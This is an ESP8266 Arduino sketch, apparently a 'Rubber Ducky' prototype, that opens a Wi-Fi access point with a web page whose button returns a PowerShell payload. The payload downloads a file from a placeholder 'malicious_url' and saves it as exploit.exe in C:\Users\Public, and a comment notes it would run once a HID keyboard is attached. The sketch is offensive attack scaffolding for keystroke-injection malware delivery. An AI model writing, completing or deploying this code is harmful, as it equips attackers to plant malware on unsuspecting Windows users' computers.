#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const char* ssid = "acesso";
const char* password = "00000000";
ESP8266WebServer server(80);

void setup() {
    Serial.begin(115200);
    WiFi.softAP(ssid, password);
    IPAddress IP = WiFi.softAPIP();
    Serial.print("Access Point IP: ");
    Serial.println(IP);

    server.on("/", HTTP_GET, []() {
        server.send(200, "text/html", "<h1>ESP8266 Rubber Ducky</h1><button onclick='sendCommand()'>Run Script</button><script>function sendCommand(){ fetch('/command'); }</script>");
    });

    server.on("/command", HTTP_GET, []() {
        String payload = "powershell -Command \"Invoke-WebRequest -Uri 'http://malicious_url' -OutFile 'C:\\Users\\Public\\exploit.exe'\"";
        server.send(200, "text/plain", "Executing: " + payload);
        Serial.println(payload);
        // Execute o comando aqui se você tiver o teclado HID
    });

    server.begin();
}

void loop() {
    server.handleClient();
}
